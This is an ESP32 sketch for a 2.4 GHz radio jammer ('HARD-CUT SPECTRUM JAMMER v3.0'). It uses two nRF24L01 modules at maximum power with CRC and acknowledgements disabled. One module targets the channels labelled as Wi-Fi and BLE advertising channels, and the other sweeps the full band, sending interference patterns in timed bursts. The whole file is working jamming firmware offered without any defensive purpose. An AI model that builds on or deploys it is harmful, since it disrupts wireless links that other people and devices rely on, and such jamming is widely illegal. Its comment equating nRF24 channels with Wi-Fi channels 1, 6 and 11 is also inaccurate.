#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// --- Pin Configuration ---
const int CE1_PIN = 26;
const int CSN1_PIN = 15;
const int SCK1_PIN = 14;
const int MOSI1_PIN = 13;
const int MISO1_PIN = 12;

const int CE2_PIN = 4;
const int CSN2_PIN = 2;
const int SCK2_PIN = 18;
const int MOSI2_PIN = 23;
const int MISO2_PIN = 19;

// --- Channel Definitions ---
// R1: Critical Wi-Fi Channels (1, 6, 11) + BLE Adv (2, 26, 80)
const int CRITICAL_CH[] = {1, 6, 11, 2, 26, 80};
const int NUM_CRITICAL = 6;

// R2: Full Band Sweep (1-80)
const int FULL_SWEEP[80] = {
  1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
  11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
  21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
  31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
  41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
  51, 52, 53, 54, 55, 56, 57, 58, 59, 60,
  61, 62, 63, 64, 65, 66, 67, 68, 69, 70,
  71, 72, 73, 74, 75, 76, 77, 78, 79, 80
};
const int NUM_SWEEP = 80;

// --- Interference Payloads ---
// Pattern 0: Max Energy (0xFF) - Best for AGC Confusion
const byte pat_max[32] = {
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};

// Pattern 1: High Contrast (0xFF/0x00) - Destroys OFDM
const byte pat_wifi[32] = {
  0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00,
  0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00,
  0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA,
  0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA
};

// Pattern 2: Pseudo-Random (High Entropy)
const byte pat_ble[32] = {
  0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0x42, 0x69,
  0xF0, 0x0F, 0xA5, 0x5A, 0xCC, 0x33, 0x96, 0x69,
  0x3C, 0xC3, 0x77, 0xE8, 0x1D, 0x4B, 0xA2, 0x9C,
  0x6F, 0x2E, 0x84, 0xD1, 0x5B, 0x07, 0xF3, 0xC9
};

const byte *patterns[3] = {pat_max, pat_wifi, pat_ble};
const int NUM_PATTERNS = 3;

// --- Global Objects ---
RF24 radio1(CE1_PIN, CSN1_PIN, 16000000);
RF24 radio2(CE2_PIN, CSN2_PIN, 16000000);

SPIClass *hp = nullptr;
SPIClass *sp = nullptr;

// --- State ---
bool r1_ok = false;
bool r2_ok = false;
int criticalIdx = 0;
int sweepIdx = 0;
int patIdx = 0;
int currentCh1 = -1;
int currentCh2 = -1;
unsigned long lastHealth = 0;
unsigned long lastTelemetry = 0;
unsigned long lastPatternChange = 0;
unsigned long lastBurstToggle = 0;
bool burstActive = true;
static unsigned long _loopCount = 0;

// --- Functions ---
void initSPIBuses() {
  hp = new SPIClass(HSPI);
  hp->begin(SCK1_PIN, MISO1_PIN, MOSI1_PIN, CSN1_PIN);
  sp = new SPIClass(VSPI);
  sp->begin(SCK2_PIN, MISO2_PIN, MOSI2_PIN, CSN2_PIN);
}

bool initRadio(RF24 &r, SPIClass *spi, const char* name, int cePin) {
  for (int i = 0; i < 5; i++) {
    delay(100);
    if (r.begin(spi)) {
      r.setAutoAck(false);
      r.stopListening();
      r.setRetries(0, 0);
      r.setPALevel(RF24_PA_MAX, true);
      r.setDataRate(RF24_2MBPS);
      r.setCRCLength(RF24_CRC_DISABLED);
      r.setPayloadSize(32);
      r.setAddressWidth(3);
      r.openWritingPipe(0xE7E7E7LL);
      r.flush_tx();
      digitalWrite(cePin, HIGH);
      Serial.print(name);
      Serial.println(" OK.");
      return true;
    }
    Serial.print(name);
    Serial.print(" Attempt ");
    Serial.print(i + 1);
    Serial.println(" failed.");
  }
  return false;
}

inline void firePacket(RF24 &r, int cePin) {
  if (!r.writeFast(patterns[patIdx], 32)) {
    r.flush_tx();
    r.writeFast(patterns[patIdx], 32);
  }
}

void healthCheck() {
  if (r1_ok) {
    if (!radio1.isChipConnected()) {
      Serial.println("[WARN] R1 lost. Recovering...");
      r1_ok = false;
      delayMicroseconds(100);
      r1_ok = initRadio(radio1, hp, "R1", CE1_PIN);
    }
  } else {
    r1_ok = initRadio(radio1, hp, "R1", CE1_PIN);
  }

  if (r2_ok) {
    if (!radio2.isChipConnected()) {
      Serial.println("[WARN] R2 lost. Recovering...");
      r2_ok = false;
      delayMicroseconds(100);
      r2_ok = initRadio(radio2, sp, "R2", CE2_PIN);
    }
  } else {
    r2_ok = initRadio(radio2, sp, "R2", CE2_PIN);
  }
}

void telemetry() {
  Serial.print("R1:"); Serial.print(r1_ok ? "OK" : "--");
  Serial.print(" R2:"); Serial.print(r2_ok ? "OK" : "--");
  Serial.print(" | CRIT:"); Serial.print(CRITICAL_CH[criticalIdx]);
  Serial.print(" SWEEP:"); Serial.print(FULL_SWEEP[sweepIdx]);
  Serial.print(" PAT:"); Serial.print(patIdx + 1);
  Serial.print(" BURST:"); Serial.println(burstActive ? "ON" : "OFF");
}

// --- Setup ---
void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n================================");
  Serial.println("  HARD-CUT SPECTRUM JAMMER v3.0");
  Serial.println("  Burst + Saturation Mode");
  Serial.println("================================");

  // Disable ESP32 internal radios
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_bt_controller_deinit();

  pinMode(CE1_PIN, OUTPUT);
  pinMode(CE2_PIN, OUTPUT);
  digitalWrite(CE1_PIN, HIGH);
  digitalWrite(CE2_PIN, HIGH);

  initSPIBuses();
  r1_ok = initRadio(radio1, hp, "R1(HSPI)", CE1_PIN);
  r2_ok = initRadio(radio2, sp, "R2(VSPI)", CE2_PIN);

  Serial.println("Strategy:");
  Serial.println("  R1: Dwell on Ch 1,6,11 (Wi-Fi Focus)");
  Serial.println("  R2: Sweep Ch 1-80 (Full Band)");
  Serial.println("  Mode: Burst Jamming (100ms ON / 10ms OFF)");
  Serial.println("Active.\n");
}

// --- Main Loop ---
void loop() {
  _loopCount++;
  unsigned long now = millis();

  // 1. Burst Jamming Logic: Toggle CE pin every 100ms/10ms
  if (now - lastBurstToggle > (burstActive ? 100 : 10)) {
    lastBurstToggle = now;
    burstActive = !burstActive;
    digitalWrite(CE1_PIN, burstActive ? HIGH : LOW);
    digitalWrite(CE2_PIN, burstActive ? HIGH : LOW);
  }

  // 2. Pattern Rotation: Every 50ms
  if (now - lastPatternChange > 50) {
    lastPatternChange = now;
    patIdx = (patIdx + 1) % NUM_PATTERNS;
  }

  // 3. Transmit if Burst is Active
  if (burstActive) {
    // R1: Dwell on Critical Channels
    if (r1_ok) {
      if (CRITICAL_CH[criticalIdx] != currentCh1) {
        radio1.setChannel(CRITICAL_CH[criticalIdx]);
        currentCh1 = CRITICAL_CH[criticalIdx];
      }
      firePacket(radio1, CE1_PIN);
      criticalIdx = (criticalIdx + 1) % NUM_CRITICAL;
    }

    // R2: Sweep Full Band
    if (r2_ok) {
      if (FULL_SWEEP[sweepIdx] != currentCh2) {
        radio2.setChannel(FULL_SWEEP[sweepIdx]);
        currentCh2 = FULL_SWEEP[sweepIdx];
      }
      firePacket(radio2, CE2_PIN);
      sweepIdx = (sweepIdx + 1) % NUM_SWEEP;
    }
  }

  // Health Check (Every 500ms)
  if (now - lastHealth > 500) {
    lastHealth = now;
    healthCheck();
  }

  // Telemetry (Every 1000ms)
  if (now - lastTelemetry > 1000) {
    lastTelemetry = now;
    telemetry();
  }
}